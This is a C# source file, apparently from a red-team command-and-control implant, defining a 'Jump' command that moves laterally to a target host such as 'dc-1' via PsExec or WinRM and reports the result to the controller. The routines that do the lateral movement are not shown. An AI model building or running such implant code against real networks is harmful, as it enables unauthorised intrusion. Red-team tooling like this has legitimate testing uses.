using System;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;

namespace Drone.Commands;

public partial class Jump : DroneCommand
{
    public override byte Command => 0x20;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        // params[0] == method
        // params[1] == target
        // jump psexec dc-1

        var method = task.Arguments[0].ToLowerInvariant();
        var target = task.Arguments[1];
        
        var success = method switch
        {
            "psexec" => JumpPsexec(target, task.Artefact),
            "winrm" => JumpWinRm(target, task.Artefact),
            
            _ => throw new ArgumentOutOfRangeException()
        };

        if (success)
        {
            await Drone.SendTaskComplete(task);
            return;
        }
        
        await Drone.SendError(task, $"Jump {method} {target} failed.");
    }
}